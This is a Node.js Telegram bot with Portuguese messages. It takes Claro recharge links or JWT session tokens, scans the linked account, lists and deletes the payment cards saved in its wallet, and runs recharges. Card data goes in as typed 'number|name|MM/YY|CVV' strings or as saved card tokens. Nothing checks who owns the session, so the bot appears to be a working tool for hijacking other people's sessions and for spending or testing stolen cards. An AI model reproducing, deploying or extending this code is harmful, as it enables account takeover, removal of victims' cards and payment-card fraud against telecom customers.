#!/usr/bin/env node
import { runScan } from './lib/run-scan.mjs';
import {
  deleteWalletCard,
  deleteAllWalletCards,
  fetchWalletCards,
} from './lib/eldorado.mjs';
import { runRecharge } from './lib/recharge.mjs';
import {
  formatTelegramReport,
  buildCardKeyboard,
  buildConfirmKeyboard,
  WELCOME,
} from './lib/telegram-format.mjs';
import {
  formatRechargeResult,
  buildValueKeyboard,
  buildPayMethodKeyboard,
  RECHARGE_HELP,
} from './lib/recharge-format.mjs';

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
if (!TOKEN) {
  console.error('Defina TELEGRAM_BOT_TOKEN');
  process.exit(1);
}

const API = `https://api.telegram.org/bot${TOKEN}`;
let offset = 0;
const busy = new Set();
const cache = new Map();
const rechargeFlow = new Map();
const CACHE_TTL = 10 * 60 * 1000;

async function tg(method, body = {}) {
  const res = await fetch(`${API}/${method}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body),
  });
  const data = await res.json();
  if (!data.ok) {
    throw new Error(data.description || `Telegram ${method} failed`);
  }
  return data.result;
}

async function send(chatId, text, extra = {}) {
  return tg('sendMessage', {
    chat_id: chatId,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    ...extra,
  });
}

function extractLink(text) {
  if (!text) return null;
  const trimmed = text.trim();
  if (trimmed.startsWith('/')) return null;
  const jwtMatch = trimmed.match(/[?&]t=([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)/);
  if (jwtMatch) return jwtMatch[1];
  if (/^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(trimmed)) {
    return trimmed;
  }
  if (trimmed.includes('clarorecarga.claro.com.br') || trimmed.includes('select-login')) {
    return trimmed;
  }
  return null;
}

function getCache(chatId) {
  const entry = cache.get(chatId);
  if (!entry || Date.now() > entry.expiresAt) {
    cache.delete(chatId);
    return null;
  }
  return entry;
}

function setCache(chatId, data) {
  cache.set(chatId, { ...data, expiresAt: Date.now() + CACHE_TTL });
}

function clearRecharge(chatId) {
  rechargeFlow.delete(chatId);
}

function parseCompactCard(text) {
  const parts = text.trim().split('|').map((s) => s.trim());
  if (parts.length !== 4) return null;
  const [number, holder, expiry, cvv] = parts;
  if (!/^\d{13,19}$/.test(number.replace(/\D/g, ''))) return null;
  if (!/^\d{2}\/\d{2,4}$/.test(expiry)) return null;
  if (!/^\d{3,4}$/.test(cvv)) return null;
  return {
    number: number.replace(/\D/g, ''),
    holder,
    expiry,
    cvv,
  };
}

async function startRechargePicker(chatId) {
  const entry = getCache(chatId);
  if (!entry?.sessionId || !entry?.valores?.length) {
    await send(
      chatId,
      '❌ Faça a varredura primeiro (envie o link JWT).\n\nDepois use /recarga ou toque em <b>💳 Recarregar</b>.',
    );
    return;
  }

  clearRecharge(chatId);
  await send(chatId, `<b>Escolha o valor</b> (${entry.msisdn}):`, {
    reply_markup: buildValueKeyboard(entry.valores),
  });
}

async function onValueSelected(chatId, messageId, productId) {
  const entry = getCache(chatId);
  if (!entry) {
    await send(chatId, '❌ Sessão expirada. Envie o link novamente.');
    return;
  }

  const product = entry.valores.find((v) => v.id === productId);
  if (!product) {
    await send(chatId, '❌ Valor indisponível.');
    return;
  }

  rechargeFlow.set(chatId, {
    step: 'pick_card',
    productId: product.id,
    productValue: product.value,
    productName: product.name,
    card: {},
  });

  const hasCards = entry.cards?.length > 0;
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: `<b>${product.name}</b> selecionado.\n\nComo deseja pagar?`,
    parse_mode: 'HTML',
    reply_markup: hasCards
      ? buildPayMethodKeyboard(entry.cards)
      : undefined,
  });

  if (!hasCards) {
    rechargeFlow.set(chatId, {
      ...rechargeFlow.get(chatId),
      step: 'card_number',
    });
    await send(
      chatId,
      '📝 Digite o <b>número do cartão</b> (16 dígitos):\n\nOu envie: <code>NUMERO|NOME|MM/AA|CVV</code>',
    );
  }
}

async function executeRecharge(chatId, card) {
  const entry = getCache(chatId);
  const flow = rechargeFlow.get(chatId);
  if (!entry?.sessionId || !flow?.productId) {
    await send(chatId, '❌ Sessão expirada. Comece de novo com /recarga');
    clearRecharge(chatId);
    return;
  }

  if (busy.has(chatId)) {
    await send(chatId, '⏳ Aguarde…');
    return;
  }

  busy.add(chatId);
  const statusMsg = await send(
    chatId,
    `💳 Processando <b>${flow.productName}</b>…\n<i>Tokenizando → pagamento → confirmação</i>`,
  );

  try {
    const outcome = await runRecharge({
      sessionId: entry.sessionId,
      msisdn: entry.msisdn,
      productId: flow.productId,
      productValue: flow.productValue,
      card,
    });

    const report = formatRechargeResult(outcome);
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: report,
      parse_mode: 'HTML',
    });
  } catch (err) {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: `❌ <b>Erro na recarga:</b> ${err.message.replace(/</g, '&lt;')}`,
      parse_mode: 'HTML',
    });
  } finally {
    busy.delete(chatId);
    clearRecharge(chatId);
  }
}

async function handleRechargeInput(chatId, text) {
  const flow = rechargeFlow.get(chatId);
  if (!flow) return false;

  const compact = parseCompactCard(text);
  if (compact && ['pick_card', 'card_number', 'holder', 'expiry', 'cvv'].includes(flow.step)) {
    await executeRecharge(chatId, compact);
    return true;
  }

  switch (flow.step) {
    case 'card_number': {
      const num = text.replace(/\D/g, '');
      if (num.length < 13 || num.length > 19) {
        await send(chatId, '❌ Número inválido. Digite 13–19 dígitos.');
        return true;
      }
      flow.card.number = num;
      flow.step = 'holder';
      rechargeFlow.set(chatId, flow);
      await send(chatId, '📝 <b>Nome</b> igual ao cartão:');
      return true;
    }
    case 'holder': {
      if (text.length < 3) {
        await send(chatId, '❌ Nome muito curto.');
        return true;
      }
      flow.card.holder = text.toUpperCase();
      flow.step = 'expiry';
      rechargeFlow.set(chatId, flow);
      await send(chatId, '📝 <b>Validade</b> (MM/AA):');
      return true;
    }
    case 'expiry': {
      if (!/^\d{2}\/\d{2,4}$/.test(text.trim())) {
        await send(chatId, '❌ Use formato MM/AA (ex: 12/30)');
        return true;
      }
      flow.card.expiry = text.trim();
      flow.step = 'cvv';
      rechargeFlow.set(chatId, flow);
      await send(chatId, '📝 <b>CVV</b> (3 ou 4 dígitos):');
      return true;
    }
    case 'cvv': {
      if (!/^\d{3,4}$/.test(text.trim())) {
        await send(chatId, '❌ CVV inválido.');
        return true;
      }
      flow.card.cvv = text.trim();
      rechargeFlow.set(chatId, flow);
      await executeRecharge(chatId, flow.card);
      return true;
    }
    case 'cvv_saved': {
      if (!/^\d{3,4}$/.test(text.trim())) {
        await send(chatId, '❌ CVV inválido.');
        return true;
      }
      const saved = flow.savedCard;
      await executeRecharge(chatId, {
        token: saved.token,
        cvv: text.trim(),
        brand: saved.brand,
        bin: saved.bin,
        last: saved.last,
        expirationMonth: saved.expirationMonth,
        expirationYear: saved.expirationYear,
        holder: saved.holder?.name ?? '',
        wasSaved: true,
      });
      return true;
    }
    default:
      return false;
  }
}

async function doScan(chatId, link, { skipWallet = false, editMsg = null } = {}) {
  if (busy.has(chatId)) {
    await send(chatId, '⏳ Aguarde a operação anterior…');
    return;
  }

  busy.add(chatId);
  let statusMsg = editMsg;
  if (!statusMsg) {
    statusMsg = await send(
      chatId,
      skipWallet ? '🔍 Varredura (sem wallet)…' : '🔍 Varredura completa…\n<i>~3–5 segundos</i>',
    );
  }

  try {
    const result = await runScan(link, { skipWallet });
    const { summary, walletAuth, wallet, session } = result;
    const report = formatTelegramReport(summary);

    const rawCards = wallet?.walletCards?.body ?? [];
    setCache(chatId, {
      link,
      walletAuth: walletAuth ?? null,
      cards: rawCards,
      sessionId: session.id,
      msisdn: session.identifier,
      valores: summary.valoresDisponiveis,
    });

    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: report,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: buildCardKeyboard(rawCards),
    });
  } catch (err) {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: `❌ <b>Erro:</b> ${err.message.replace(/</g, '&lt;')}`,
      parse_mode: 'HTML',
    });
  } finally {
    busy.delete(chatId);
  }
}

async function refreshCardsView(chatId, messageId, entry) {
  const cardsRes = await fetchWalletCards(
    entry.walletAuth.bemobiToken,
    entry.walletAuth.checkoutCode,
  );
  const rawCards = Array.isArray(cardsRes.body) ? cardsRes.body : [];
  entry.cards = rawCards;
  setCache(chatId, entry);

  const { summary } = await runScan(entry.link, { skipWallet: true });
  summary.cartoes.walletEldorado = rawCards.map((c) => ({
    brand: c.brand,
    bin: c.bin,
    last: c.last,
    expiration: `${String(c.expirationMonth).padStart(2, '0')}/${c.expirationYear}`,
    type: c.type,
  }));
  summary.cartoes.claroApi = summary.cartoes.claroApi ?? [];
  summary.cartoes.total =
    summary.cartoes.walletEldorado.length + summary.cartoes.claroApi.length;

  const report = formatTelegramReport(summary);
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: report,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    reply_markup: buildCardKeyboard(rawCards),
  });
}

async function executeRemove(chatId, messageId, cardToken) {
  const entry = getCache(chatId);
  if (!entry?.walletAuth) {
    await send(chatId, '❌ Sessão expirada. Envie o link novamente.');
    return;
  }

  const card = entry.cards.find((c) => c.token === cardToken);
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: '🗑 Removendo cartão…',
    parse_mode: 'HTML',
  });

  try {
    const res = await deleteWalletCard(
      entry.walletAuth.bemobiToken,
      entry.walletAuth.checkoutCode,
      cardToken,
    );
    if (res.status !== 200 && res.status !== 204) {
      throw new Error(`HTTP ${res.status}`);
    }

    const label = card ? `${card.brand} *${card.last}` : 'cartão';
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: `✅ <b>Removido:</b> ${label}`,
      parse_mode: 'HTML',
    });

    await refreshCardsView(chatId, messageId, entry);
  } catch (err) {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: `❌ Falha ao remover: ${err.message}`,
      parse_mode: 'HTML',
    });
  }
}

async function executeRemoveAll(chatId, messageId) {
  const entry = getCache(chatId);
  if (!entry?.walletAuth || !entry.cards.length) {
    await send(chatId, '❌ Nenhum cartão em cache.');
    return;
  }

  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: `🗑 Removendo ${entry.cards.length} cartão(ões)…`,
    parse_mode: 'HTML',
  });

  try {
    const { ok, total } = await deleteAllWalletCards(
      entry.walletAuth.bemobiToken,
      entry.walletAuth.checkoutCode,
      entry.cards,
    );

    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: `✅ <b>${ok}/${total}</b> cartões removidos.`,
      parse_mode: 'HTML',
    });

    await refreshCardsView(chatId, messageId, entry);
  } catch (err) {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: `❌ Falha: ${err.message}`,
      parse_mode: 'HTML',
    });
  }
}

async function handleRemove(chatId, messageId, cardToken, cardLabel) {
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: `⚠️ <b>Confirmar remoção?</b>\n\nCartão: <b>${cardLabel}</b>`,
    parse_mode: 'HTML',
    reply_markup: buildConfirmKeyboard(cardToken, 'rm'),
  });
}

async function handleCallback(query) {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;

  await tg('answerCallbackQuery', { callback_query_id: query.id }).catch(() => {});

  if (data === 'recarga:start') {
    await startRechargePicker(chatId);
    return;
  }

  if (data === 'rcg:cancel') {
    clearRecharge(chatId);
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: '❌ Recarga cancelada.',
      parse_mode: 'HTML',
    });
    return;
  }

  if (data.startsWith('rcg:') && data !== 'rcg:cancel') {
    const productId = data.slice(4);
    await onValueSelected(chatId, messageId, productId);
    return;
  }

  if (data === 'rcgpay:new') {
    const flow = rechargeFlow.get(chatId);
    if (!flow) return;
    flow.step = 'card_number';
    rechargeFlow.set(chatId, flow);
    await send(
      chatId,
      '📝 Digite o <b>número do cartão</b>:\n\nOu: <code>NUMERO|NOME|MM/AA|CVV</code>',
    );
    return;
  }

  if (data.startsWith('rcgpay:')) {
    const token = data.slice(7);
    const entry = getCache(chatId);
    const saved = entry?.cards?.find((c) => c.token === token);
    const flow = rechargeFlow.get(chatId);
    if (!saved || !flow) {
      await send(chatId, '❌ Cartão não encontrado.');
      return;
    }
    flow.step = 'cvv_saved';
    flow.savedCard = saved;
    rechargeFlow.set(chatId, flow);
    await send(chatId, `🏦 <b>${saved.brand} *${saved.last}</b>\n\nDigite o <b>CVV</b>:`);
    return;
  }

  if (data === 'cancel') {
    const entry = getCache(chatId);
    if (entry?.link) {
      await doScan(chatId, entry.link, { editMsg: { message_id: messageId } });
    }
    return;
  }

  if (data === 'rmall:confirm') {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: '⚠️ <b>Remover TODOS os cartões?</b>',
      parse_mode: 'HTML',
      reply_markup: buildConfirmKeyboard('all', 'rmall'),
    });
    return;
  }

  if (data === 'rmallok:all') {
    await executeRemoveAll(chatId, messageId);
    return;
  }

  if (data.startsWith('rm:') && !data.startsWith('rmok:')) {
    const token = data.slice(3);
    const entry = getCache(chatId);
    const card = entry?.cards.find((c) => c.token === token);
    const label = card ? `${card.brand} *${card.last}` : token.slice(0, 8);
    await handleRemove(chatId, messageId, token, label);
    return;
  }

  if (data.startsWith('rmok:')) {
    await executeRemove(chatId, messageId, data.slice(5));
  }
}

async function handleMessage(msg) {
  const chatId = msg.chat.id;
  const text = msg.text?.trim() ?? '';

  if (rechargeFlow.has(chatId)) {
    const handled = await handleRechargeInput(chatId, text);
    if (handled) return;
  }

  if (text === '/start' || text === '/help') {
    await send(chatId, WELCOME);
    return;
  }

  if (text === '/recarga') {
    await startRechargePicker(chatId);
    return;
  }

  if (text === '/status') {
    await send(chatId, `🟢 Online · ${Math.floor(process.uptime())}s`);
    return;
  }

  if (text === '/cartoes') {
    const entry = getCache(chatId);
    if (!entry?.cards?.length) {
      await send(chatId, '❌ Nenhum cartão em cache. Varredura necessária.');
      return;
    }
    await send(chatId, `<b>Cartões (${entry.cards.length})</b>:`, {
      reply_markup: buildCardKeyboard(entry.cards),
    });
    return;
  }

  const skipWallet = text.startsWith('/scan');
  const link = extractLink(skipWallet ? text.replace(/^\/scan\s*/, '') : text);

  if (!link) {
    if (text.startsWith('/')) {
      await send(chatId, 'Comando desconhecido. /start\n/recarga — ' + RECHARGE_HELP.split('\n')[0]);
    } else {
      await send(chatId, '❌ Envie o link <code>?t=...</code> ou JWT puro.');
    }
    return;
  }

  await doScan(chatId, link, { skipWallet });
}

async function poll() {
  console.log('[bot] polling (+ recarga)…');
  while (true) {
    try {
      const updates = await tg('getUpdates', {
        offset,
        timeout: 25,
        allowed_updates: ['message', 'callback_query'],
      });

      for (const update of updates) {
        offset = update.update_id + 1;
        if (update.message) {
          handleMessage(update.message).catch((e) => console.error('[msg]', e.message));
        }
        if (update.callback_query) {
          handleCallback(update.callback_query).catch((e) => console.error('[cb]', e.message));
        }
      }
    } catch (err) {
      console.error('[bot] poll:', err.message);
      await new Promise((r) => setTimeout(r, 2000));
    }
  }
}

async function main() {
  const me = await tg('getMe');
  console.log(`[bot] @${me.username} online`);
  await tg('deleteWebhook', { drop_pending_updates: false });
  poll();
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
